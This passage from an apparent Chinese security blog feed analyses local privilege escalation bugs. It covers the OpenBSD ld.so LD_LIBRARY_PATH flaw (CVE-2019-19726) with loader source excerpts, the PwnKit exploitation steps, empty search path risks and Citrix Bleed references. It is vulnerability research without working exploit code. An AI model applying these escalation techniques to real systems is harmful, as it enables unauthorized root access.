class="title">rlimit</span> <span class="title">rl</span>;</span></span><br><span class="line">    getrlimit(RLIMIT_DATA, &amp;rl);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cur=%lu, max=%lu\n"</span>, rl.rlim_cur, rl.rlim_max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">try_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc %lu bytes: "</span>, size);</span><br><span class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, strerror(errno));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Succeeded\n"</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> val = <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rl</span> = &#123;</span>val, val&#125;;</span><br><span class="line">    show_rlimit();</span><br><span class="line">    setrlimit(RLIMIT_DATA, &amp;rl);</span><br><span class="line">    show_rlimit();</span><br><span class="line"></span><br><span class="line">    try_malloc(<span class="number">1024</span>);</span><br><span class="line">    try_malloc(val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./a.out</span><br><span class="line">cur=18446744073709551615, max=18446744073709551615</span><br><span class="line">cur=1048576, max=1048576</span><br><span class="line">malloc 1024 bytes: Succeeded</span><br><span class="line">malloc 1048576 bytes: Cannot allocate memory</span><br></pre></td></tr></table></figure><h3 id="2-2-ARG-MAX"><a href="#2-2-ARG-MAX" class="headerlink" title="2.2 ARG_MAX"></a>2.2 ARG_MAX</h3><p><strong>ARG_MAX</strong> 定义于 <code>limits.h</code> 头文件中，表示程序命令行参数（包含环境变量参数）的最大大小。</p><blockquote><p><strong>ARG_MAX</strong></p><p>Maximum length of argument to the <em>exec</em> functions including environment data.<br>Minimum Acceptable Value: {_POSIX_ARG_MAX}</p><p><strong>_POSIX_ARG_MAX</strong></p><p>Maximum length of argument to the <em>exec</em> functions including environment data.<br>Value: 4096</p></blockquote><h3 id="2-3-CVE-2019-19726"><a href="#2-3-CVE-2019-19726" class="headerlink" title="2.3 CVE-2019-19726"></a>2.3 CVE-2019-19726</h3><p>对于 SUID-root 程序，链接器 <code>ld.so</code> 需要去除危险的环境变量（比如 <code>LD_LIBRARY_PATH</code> 等），以防止通过环境变量来实现提权。</p><p>比如，glibc 中的 <code>_dl_non_dynamic_init</code> 函数负责清理此类危险的环境变量：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_non_dynamic_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">  <span class="keyword">if</span> (__libc_enable_secure)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> unsecure_envvars[] =</span><br><span class="line">    UNSECURE_ENVVARS</span><br><span class="line">#ifdef EXTRA_UNSECURE_ENVVARS</span><br><span class="line">    EXTRA_UNSECURE_ENVVARS</span><br><span class="line">#endif</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *cp = unsecure_envvars;</span><br><span class="line">    <span class="keyword">while</span> (cp &lt; unsecure_envvars + <span class="keyword">sizeof</span> (unsecure_envvars))</span><br><span class="line">    &#123;</span><br><span class="line">      __unsetenv (cp);</span><br><span class="line">      cp = (<span class="keyword">const</span> <span class="keyword">char</span> *) __rawmemchr (cp, <span class="string">'\0'</span>) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !HAVE_TUNABLES</span></span><br><span class="line">    <span class="keyword">if</span> (__access (<span class="string">"/etc/suid-debug"</span>, F_OK) != <span class="number">0</span>)</span><br><span class="line">      __unsetenv (<span class="string">"MALLOC_CHECK_"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UNSECURE_ENVVARS</code> 的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class="line"><span class="comment">   all stuffed in a single string which means they have to be terminated</span></span><br><span class="line"><span class="comment">   with a '\0' explicitly.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNSECURE_ENVVARS    \</span></span><br><span class="line">  <span class="string">"GCONV_PATH\0"</span>            \</span><br><span class="line">  <span class="string">"GETCONF_DIR\0"</span>           \</span><br><span class="line">  GLIBC_TUNABLES_ENVVAR     \</span><br><span class="line">  <span class="string">"HOSTALIASES\0"</span>           \</span><br><span class="line">  <span class="string">"LD_AUDIT\0"</span>              \</span><br><span class="line">  <span class="string">"LD_DEBUG\0"</span>              \</span><br><span class="line">  <span class="string">"LD_DEBUG_OUTPUT\0"</span>       \</span><br><span class="line">  <span class="string">"LD_DYNAMIC_WEAK\0"</span>       \</span><br><span class="line">  <span class="string">"LD_HWCAP_MASK\0"</span>         \</span><br><span class="line">  <span class="string">"LD_LIBRARY_PATH\0"</span>       \</span><br><span class="line">  <span class="string">"LD_ORIGIN_PATH\0"</span>        \</span><br><span class="line">  <span class="string">"LD_PRELOAD\0"</span>            \</span><br><span class="line">  <span class="string">"LD_PROFILE\0"</span>            \</span><br><span class="line">  <span class="string">"LD_SHOW_AUXV\0"</span>          \</span><br><span class="line">  <span class="string">"LD_USE_LOAD_BIAS\0"</span>      \</span><br><span class="line">  <span class="string">"LOCALDOMAIN\0"</span>           \</span><br><span class="line">  <span class="string">"LOCPATH\0"</span>               \</span><br><span class="line">  <span class="string">"MALLOC_TRACE\0"</span>          \</span><br><span class="line">  <span class="string">"NIS_PATH\0"</span>              \</span><br><span class="line">  <span class="string">"NLSPATH\0"</span>               \</span><br><span class="line">  <span class="string">"RESOLV_HOST_CONF\0"</span>      \</span><br><span class="line">  <span class="string">"RES_OPTIONS\0"</span>           \</span><br><span class="line">  <span class="string">"TMPDIR\0"</span>                \</span><br><span class="line">  <span class="string">"TZDIR\0"</span></span><br></pre></td></tr></table></figure><p>FreeBSD 相关处理代码如下（参考 <a href="https://github.com/openbsd/src/blob/d2ce55dbd7845b33dafe44529e6ceb6b1c8ec6d5/libexec/ld.so/loader.c#L263" target="_blank" rel="noopener">src/libexec/ld.so/loader.c</a>）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * grab interesting environment variables, zap bad env vars if</span></span><br><span class="line"><span class="comment"> * issetugid, and set the exported environ and __progname variables</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_setup_env(<span class="keyword">const</span> <span class="keyword">char</span> *argv0, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> progname_storage[NAME_MAX+<span class="number">1</span>] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Get paths to various things we are going to use.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  _dl_debug = _dl_getenv(<span class="string">"LD_DEBUG"</span>, envp) != <span class="literal">NULL</span>;</span><br><span class="line">  _dl_libpath = _dl_split_path(_dl_getenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp));</span><br><span class="line">  _dl_preload = _dl_getenv(<span class="string">"LD_PRELOAD"</span>, envp);</span><br><span class="line">  _dl_bindnow = _dl_getenv(<span class="string">"LD_BIND_NOW"</span>, envp) != <span class="literal">NULL</span>;</span><br><span class="line">  _dl_traceld = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS"</span>, envp) != <span class="literal">NULL</span>;</span><br><span class="line">  _dl_tracefmt1 = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS_FMT1"</span>, envp);</span><br><span class="line">  _dl_tracefmt2 = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS_FMT2"</span>, envp);</span><br><span class="line">  _dl_traceprog = _dl_getenv(<span class="string">"LD_TRACE_LOADED_OBJECTS_PROGNAME"</span>, envp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Don't allow someone to change the search paths if he runs</span></span><br><span class="line"><span class="comment">   * a suid program without credentials high enough.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  _dl_trust = !_dl_issetugid();</span><br><span class="line">  <span class="keyword">if</span> (!_dl_trust) &#123;  <span class="comment">/* Zap paths if s[ug]id... */</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_libpath) &#123;</span><br><span class="line">      _dl_free_path(_dl_libpath);</span><br><span class="line">      _dl_libpath = <span class="literal">NULL</span>;</span><br><span class="line">      _dl_unsetenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (_dl_preload) &#123;</span><br><span class="line">      _dl_preload = <span class="literal">NULL</span>;</span><br><span class="line">      _dl_unsetenv(<span class="string">"LD_PRELOAD"</span>, envp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对 <code>LD_LIBRARY_PATH</code> 的处理有点特殊，额外调用了 <code>_dl_split_path</code> 函数，对应的代码如下（参考 <a href="https://github.com/openbsd/src/blob/d2ce55dbd7845b33dafe44529e6ceb6b1c8ec6d5/libexec/ld.so/path.c#L24" target="_blank" rel="noopener">src/libexec/ld.so/path.c</a>）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> **</span><br><span class="line">_dl_split_path(<span class="keyword">const</span> <span class="keyword">char</span> *searchpath)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *pp, *p_begin;</span><br><span class="line">  <span class="keyword">char</span> **retval;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (searchpath == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Count ':' or ';' in searchpath */</span></span><br><span class="line">  pp = searchpath;</span><br><span class="line">  <span class="keyword">while</span> (*pp) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pp == <span class="string">':'</span> || *pp == <span class="string">';'</span>)</span><br><span class="line">      count++;</span><br><span class="line">    pp++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* one more for NULL entry */</span></span><br><span class="line">  count++;</span><br><span class="line"></span><br><span class="line">  retval = _dl_reallocarray(<span class="literal">NULL</span>, count, <span class="keyword">sizeof</span>(*retval));</span><br><span class="line">  <span class="keyword">if</span> (retval == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用 <code>_dl_reallocarray</code> 分配内存，如果分配失败，<code>_dl_split_path</code> 将返回 <code>NULL</code>。</p><p>回到 <code>_dl_setup_env</code> 函数，可以发现当 <code>_dl_split_path</code> 返回 <code>NULL</code> 时，环境变量 <code>LD_LIBRARY_PATH</code> 将不会被清理，此时可以通过 so 动态库加载劫持来实现 root 提权。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_dl_libpath = _dl_split_path(_dl_getenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp));</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">_dl_trust = !_dl_issetugid();</span><br><span class="line"><span class="keyword">if</span> (!_dl_trust) &#123;  <span class="comment">/* Zap paths if s[ug]id... */</span></span><br><span class="line">  <span class="keyword">if</span> (_dl_libpath) &#123;</span><br><span class="line">    _dl_free_path(_dl_libpath);</span><br><span class="line">    _dl_libpath = <span class="literal">NULL</span>;</span><br><span class="line">    _dl_unsetenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03. 漏洞利用"></a>0x03. 漏洞利用</h2><p>原作者挑选了 <code>/usr/bin/chpass</code> 来实现漏洞利用，其 <code>main</code> 函数做了以下操作：</p><ol><li>调用 <code>setuid(0)</code></li><li>调用 <code>pw_init</code> 把 <code>RLIMIT_DATA</code> 重置成了 <code>RLIM_INFINITY</code></li><li>调用 <code>pw_mkdb</code> 通过 <code>vfork / execv</code> 执行 <code>/usr/sbin/pwd_mkdb</code>，其中 <code>execv</code> 会继承环境变量</li></ol><p>当 <code>/usr/sbin/pwd_mkdb</code> 执行时，会重新触发 <code>ld.so</code> 中的逻辑，但由于此时已经没有了 <code>RLIMIT_DATA</code> 资源限制，以下代码会成功执行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_libpath = _dl_split_path(_dl_getenv(<span class="string">"LD_LIBRARY_PATH"</span>, envp));</span><br></pre></td></tr></table></figure><p>而由于 <code>/usr/sbin/pwd_mkdb</code> 并不是 SUID-root 程序，<code>LD_LIBRARY_PATH</code> 不会被清理，因此最终可以通过 so 动态库加载劫持来实现 root 提权。</p><p>另外需要注意的是，对 <code>/usr/bin/chpass</code> 而言，由于 <code>_dl_libpath</code> 为 <code>NULL</code>，所以 <code>LD_LIBRARY_PATH</code> 对 <code>chpass</code> 本身是不会起作用的。</p><p>综上，应该只有极少数刚好满足条件的 SUID-root 程序，才可以完成这个提权漏洞的利用。</p><h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04. References"></a>0x04. References</h2><ol><li><a href="https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt" target="_blank" rel="noopener">Local Privilege Escalation in OpenBSD’s dynamic loader (CVE-2019-19726)</a> / <a href="https://web.archive.org/web/20221218102051/https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt" target="_blank" rel="noopener">Wayback Machine</a></li><li><a href="https://pwnies.com/qualys-security-advisory-team-2/" target="_blank" rel="noopener">https://pwnies.com/qualys-security-advisory-team-2/</a></li><li><a href="https://github.com/openbsd/src/commit/eee3c75f9abd5ea51e066dd0fe6b1efa470e4d0c" target="_blank" rel="noopener">https://github.com/openbsd/src/commit/eee3c75f9abd5ea51e066dd0fe6b1efa470e4d0c</a></li><li><a href="https://linux.die.net/man/2/setrlimit" target="_blank" rel="noopener">https://linux.die.net/man/2/setrlimit</a></li><li><a href="https://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html" target="_blank" rel="noopener">https://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html</a></li><li><a href="https://codebrowser.dev/glibc/glibc/elf/dl-support.c.html" target="_blank" rel="noopener">https://codebrowser.dev/glibc/glibc/elf/dl-support.c.html</a></li><li><a href="https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html" target="_blank" rel="noopener">https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2019-19726 OpenBSD dynamic loader Local Privilege Escalation Vulnerability&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="漏洞案例研究" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="ld.so" scheme="https://programlife.net/tags/ld-so/"/>
    
      <category term="LPE" scheme="https://programlife.net/tags/LPE/"/>
    
      <category term="Pwnie Awards" scheme="https://programlife.net/tags/Pwnie-Awards/"/>
    
      <category term="LD_LIBRARY_PATH" scheme="https://programlife.net/tags/LD-LIBRARY-PATH/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-4034 PwnKit PolKit pkexec 本地提权漏洞</title>
    <link href="https://programlife.net/2024/03/17/cve-2021-4034-pwnkit-polkit-pkexec-lpe/"/>
    <id>https://programlife.net/2024/03/17/cve-2021-4034-pwnkit-polkit-pkexec-lpe/</id>
    <published>2024-03-17T13:33:37.000Z</published>
    <updated>2024-03-17T08:05:59.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CVE-2021-4034 PwnKit PolKit pkexec Local Privilege Escalation Vulnerability</p></blockquote><a id="more"></a><p>CVE-2021-4034 是 Qualys Research Team 发现的位于 PolKit pkexec 中的本地提权漏洞，漏洞取名 PwnKit，原始报告可以参考 <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">pwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)</a> / <a href="https://web.archive.org/web/20240211132200/https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">Wayback Machine</a>。</p><p>该漏洞获得了 <a href="https://pwnies.com/category/nominations/?y=2022" target="_blank" rel="noopener">Pwnie Awards / Epic Achievement</a> 提名：</p><blockquote><ul><li>THAT VIASAT THINGIE</li><li>Yuki Chen’s Windows Server-Side RCE Bugs</li><li>pwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)</li></ul></blockquote><p>这个漏洞的利用非常巧妙，有兴趣可以看下 <a href="https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3DeY0KKqRDcQBxYwD" target="_blank" rel="noopener">先知社区 - CVE-2021-4034 深入分析及漏洞复现</a> / <a href="https://web.archive.org/web/20240317025711/https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3DeY0KKqRDcQBxYwD" target="_blank" rel="noopener">Wayback Machine</a>，这篇文章介绍的比较全面（包括漏洞原理、<code>ld.so</code> 处理 SUID-root 程序的危险环境变量、Exploit 实现细节上需要注意的问题等）。</p><p><strong>漏洞利用流程</strong>：</p><ol><li><code>execve</code> 执行 PolKit pkexec 时，让 <code>argv</code> 为空数组（长度为 <code>0</code>）</li><li>PolKit pkexec <code>argv[1]</code> 越界访问（Out-of-Bounds Read 到 <code>envp[0]</code>）</li><li>相对路径扩展（通过 <code>execve</code> 控制 <code>PATH</code> 环境变量，对 <code>envp[0]</code> 实施路径扩展）</li><li><code>argv[1]</code> 越界写入（Out-of-Bounds Write），实现改写 <code>envp[0]</code>，达到注入任意环境变量的目的</li><li>利用上一步注入 <code>GCONV_PATH</code> 环境变量，配合 glib 的 <code>g_printerr</code>，在进行字符集转换时实现加载自定义 so 动态库</li><li>完成提权操作</li></ol><p><strong>漏洞利用注意事项</strong>：<code>setenv</code> <strong>可能</strong>会导致环境变量数组 <code>envp</code> 发生位置迁移</p><p><strong>漏洞修复</strong>：除了对 pkexec 本身进行修复外，操作系统层面可能不再支持 <code>execve(path, {NULL}, envp)</code> 这种操作，或者说，至少会对这种特殊的 <code>argv</code> 进行处理，比如转换成 <code>{&quot;&quot;, NULL}</code>（<code>argc</code> 仍然为 <code>0</code>），这样即使存在类似 pkexec 这样的漏洞，也无法进行利用了。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;CVE-2021-4034 PwnKit PolKit pkexec Local Privilege Escalation Vulnerability&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="漏洞案例研究" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="PolKit" scheme="https://programlife.net/tags/PolKit/"/>
    
      <category term="ld.so" scheme="https://programlife.net/tags/ld-so/"/>
    
      <category term="GCONV_PATH" scheme="https://programlife.net/tags/GCONV-PATH/"/>
    
      <category term="LPE" scheme="https://programlife.net/tags/LPE/"/>
    
      <category term="Pwnie Awards" scheme="https://programlife.net/tags/Pwnie-Awards/"/>
    
  </entry>
  
  <entry>
    <title>Linux Empty Search Path Vulnerability</title>
    <link href="https://programlife.net/2024/03/16/linux-empty-search-path-vulnerability/"/>
    <id>https://programlife.net/2024/03/16/linux-empty-search-path-vulnerability/</id>
    <published>2024-03-16T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Empty Search Path (PATH or LD_LIBRARY_PATH) could lead to security vulnerabilities.</p></blockquote><a id="more"></a><p><strong>CWE-427: Uncontrolled Search Path Element</strong></p><ul><li><p><a href="https://cwe.mitre.org/data/definitions/427.html" target="_blank" rel="noopener">CWE - CWE-427: Uncontrolled Search Path Element (4.14)</a> / <a href="https://web.archive.org/web/20240316031216/https://cwe.mitre.org/data/definitions/427.html" target="_blank" rel="noopener">Wayback Machine</a></p></li><li><blockquote><p>In some Unix-based systems, a <strong>PATH</strong> might be created that contains an empty element, e.g. by splicing an empty variable into the <strong>PATH</strong>. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.</p></blockquote></li></ul><p><strong>Empty Entry in LD_LIBRARY_PATH May Lead to Security Issues</strong></p><ul><li><p><a href="https://jdhao.github.io/2021/07/03/ld_library_path_empty_item/" target="_blank" rel="noopener">Empty Entry in LD_LIBRARY_PATH May Lead to Security Issues</a> / <a href="https://web.archive.org/web/20240316031202/https://jdhao.github.io/2021/07/03/ld_library_path_empty_item/" target="_blank" rel="noopener">Wayback Machine</a></p></li><li><blockquote><p>An empty item is interpreted by <code>ld</code> as the current working directory. As a result, <code>ld</code> may load library from the current working directory, causing unintended effects, or even security vulnerability if an attacker puts some harmful library in the current directory.</p></blockquote></li></ul><p><strong>CVE-2010-4450</strong></p><ul><li><blockquote><p>Oracle has not commented on claims from a downstream vendor that this issue is an untrusted search path vulnerability involving an empty <strong>LD_LIBRARY_PATH</strong> environment variable.</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Empty Search Path (PATH or LD_LIBRARY_PATH) could lead to security vulnerabilities.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="漏洞案例研究" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="ld.so" scheme="https://programlife.net/tags/ld-so/"/>
    
      <category term="LD_LIBRARY_PATH" scheme="https://programlife.net/tags/LD-LIBRARY-PATH/"/>
    
  </entry>
  
  <entry>
    <title>漏洞案例研究 CVE-2023-4966 Citrix Bleed 信息泄露漏洞</title>
    <link href="https://programlife.net/2024/03/11/cve-2023-4966-citrix-bleed/"/>
    <id>https://programlife.net/2024/03/11/cve-2023-4966-citrix-bleed/</id>
    <published>2024-03-11T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Citrix Bleed 漏洞（CVE-2023-4966）相关的几篇参考文档</p></blockquote><a id="more"></a><p>Citrix Bleed 漏洞，即 CVE-2023-4966，算是 2023 年比较知名的漏洞了，被 DARKNAVY 评为 <a href="https://mp.weixin.qq.com/s/YO55cT4jjqFukCdAWxkNiQ?forceh5=1" target="_blank" rel="noopener">2023 年度最费钱的漏洞</a>之一（另一个漏洞是 CVE-2023-34362），如果你没有听说过这个漏洞，可以了解下相关的背景信息。</p><p><strong>漏洞的原理非常简单</strong>：误用 <code>snprintf</code> 导致信息泄露，攻击者可以在未授权的情况下远程触发漏洞，并且可以接收到通过 OOB Read 泄露的进程内存内容，模式上类似 Heart Bleed 漏洞。</p><p>对于漏洞细节，这里不做赘述，有兴趣的读者可以阅读下面几篇文章（因为互联网上的链接总会因为各种原因而不再有效，所以我给他们做了一个备份）：</p><ol><li><a href="https://securitylab.github.com/research/librelp-buffer-overflow-cve-2018-1000140/" target="_blank" rel="noopener">Librelp buffer overflow fix (cve-2018-1000140) - a collaboration between Adiscon and Semmle</a> / <a href="https://web.archive.org/web/20240311130505/https://securitylab.github.com/research/librelp-buffer-overflow-cve-2018-1000140/" target="_blank" rel="noopener">备份存档</a></li><li><a href="https://securitylab.github.com/research/cve-2018-18820-snprintf-vulnerability-icecast/" target="_blank" rel="noopener">CVE-2018-18820: Snprintf Vulnerability in Icecast</a> / <a href="https://web.archive.org/web/20240311130514/https://securitylab.github.com/research/cve-2018-18820-snprintf-vulnerability-icecast/" target="_blank" rel="noopener">备份存档</a></li><li><a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" target="_blank" rel="noopener">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</a> / <a href="https://web.archive.org/web/20240311130513/https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" target="_blank" rel="noopener">备份存档</a></li><li><a 